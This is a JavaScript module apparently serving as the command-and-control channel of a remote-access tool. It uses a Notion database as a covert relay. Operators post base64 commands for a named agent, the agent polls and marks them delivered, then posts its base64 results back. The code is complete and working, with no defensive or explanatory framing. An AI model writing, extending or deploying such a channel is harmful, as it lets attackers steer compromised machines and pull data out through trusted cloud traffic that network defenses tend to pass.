const https = require('https');

class Notion {
  constructor(config) {
    this.apiKey = config.apiKey;
    this.databaseId = config.databaseId;
    this.apiBase = 'api.notion.com';
    this.apiVersion = '2022-06-28';
  }

  _request(method, path, body) {
    return new Promise((resolve, reject) => {
      const opts = {
        hostname: this.apiBase,
        path,
        method,
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json',
          'Notion-Version': this.apiVersion
        }
      };

      const req = https.request(opts, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`Notion API error ${res.statusCode}: ${JSON.stringify(parsed)}`));
            }
          } catch (e) {
            reject(new Error(`Notion API error ${res.statusCode}: ${data}`));
          }
        });
      });

      req.on('error', reject);
      if (body) req.write(JSON.stringify(body));
      req.end();
    });
  }

  async sendCommand(agentId, b64Payload) {
    const now = new Date().toISOString();
    const body = {
      parent: { database_id: this.databaseId },
      properties: {
        'agent_id': {
          title: [{ text: { content: agentId } }]
        },
        'command': {
          rich_text: [{ text: { content: b64Payload } }]
        },
        'status': {
          select: { name: 'pending' }
        },
        'timestamp': {
          rich_text: [{ text: { content: now } }]
        }
      }
    };

    const result = await this._request('POST', '/v1/pages', body);
    return { id: result.id };
  }

  async pollCommands(agentId) {
    const query = {
      filter: {
        and: [
          {
            property: 'agent_id',
            title: { equals: agentId }
          },
          {
            property: 'status',
            select: { equals: 'pending' }
          }
        ]
      }
    };

    const result = await this._request('POST', `/v1/databases/${this.databaseId}/query`, query);

    if (!result.results || result.results.length === 0) return [];

    const commands = [];
    for (const page of result.results) {
      const props = page.properties;
      const command = props.command?.rich_text?.[0]?.text?.content || '';
      const timestamp = props.timestamp?.rich_text?.[0]?.text?.content || '';

      commands.push({
        id: page.id,
        agentId,
        command,
        timestamp
      });

      try {
        await this._request('PATCH', `/v1/pages/${page.id}`, {
          properties: {
            'status': { select: { name: 'delivered' } }
          }
        });
      } catch (e) {
        // skip
      }
    }
    return commands;
  }

  async sendResult(agentId, b64Payload) {
    const now = new Date().toISOString();
    const body = {
      parent: { database_id: this.databaseId },
      properties: {
        'agent_id': {
          title: [{ text: { content: `result_${agentId}` } }]
        },
        'command': {
          rich_text: [{ text: { content: b64Payload } }]
        },
        'status': {
          select: { name: 'completed' }
        },
        'timestamp': {
          rich_text: [{ text: { content: now } }]
        }
      }
    };

    const result = await this._request('POST', '/v1/pages', body);
    return { id: result.id };
  }

  async test() {
    try {
      await this._request('GET', `/v1/databases/${this.databaseId}`);
      return true;
    } catch {
      return false;
    }
  }
}

module.exports = Notion;
